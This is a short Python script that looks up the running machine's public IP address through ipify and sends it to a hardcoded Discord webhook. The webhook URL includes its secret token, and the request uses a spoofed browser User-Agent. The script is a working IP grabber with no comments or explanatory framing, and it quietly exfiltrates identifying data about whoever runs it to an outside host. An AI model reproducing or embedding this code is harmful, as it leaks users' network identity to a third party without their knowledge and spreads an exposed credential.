import requests, json
from urllib.request import *

webhook_url = 'https://discord.com/api/webhooks/855973225658056714/yJSw6kvc5E5GPSvz9mcz9ksPJYCYnztRfqCUy3A235a5h009gZvby0uq6B0Tn3e5FIbz'

response = requests.get('https://api.ipify.org/?format=json')
dt = response.json()
headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
}

payload = json.dumps({'content': dt['ip']})

req = Request(webhook_url, data=payload.encode(), headers=headers)
urlopen(req)
